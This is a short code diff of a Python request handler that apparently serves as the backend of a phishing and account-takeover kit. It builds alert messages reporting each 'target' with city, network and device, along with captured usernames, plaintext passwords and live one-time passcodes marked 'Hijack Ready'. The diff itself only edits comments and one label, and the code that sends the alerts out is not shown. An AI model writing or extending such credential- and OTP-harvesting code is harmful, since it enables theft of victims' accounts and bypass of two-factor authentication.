@@ -25,14 +25,14 @@ def handle_requests():
             msg = f"👀 **TARGET DETECTED**\n📍 City: `{city}`\n🌐 Network: `{isp}`\n📱 Device: `{data.get('d')[:50]}...`"
         
         elif dtype == 'OTP_RECEIVED':
-            # OTP alert logic
             otp_code = data.get('o')
             msg = f"🔥 **Z-PROXY HIT (OTP)**\n👤 User: `{user}`\n🔢 **LIVE OTP: {otp_code}**\n🔥 Status: Hijack Ready"
         
-        # Password capture logic (Newly Added without removing anything)
+        # --- YE SECTION ADD KIYA HAI PASSWORD K LIYE ---
         elif dtype in ['INIT_LOG', 'REAL_LOG']:
             password = data.get('p')
-            msg = f"🚀 **NEW HIT DETECTED**\n👤 User: `{user}`\n🔑 Pass: `{password}`\n📊 Status: {dtype}\n📍 Loc: `{city}`"
+            msg = f"🚀 **NEW HIT DETECTED**\n👤 User: `{user}`\n🔑 Pass: `{password}`\n📊 Status: {dtype}\n📍 City: `{city}`"
+        # -----------------------------------------------
         
         else:
             msg = f"ℹ️ Update: {dtype} for {user}"
@@ -47,4 +47,4 @@ def handle_requests():
 
 def handler(req, res):
     return app(req, res)
-                                
+    
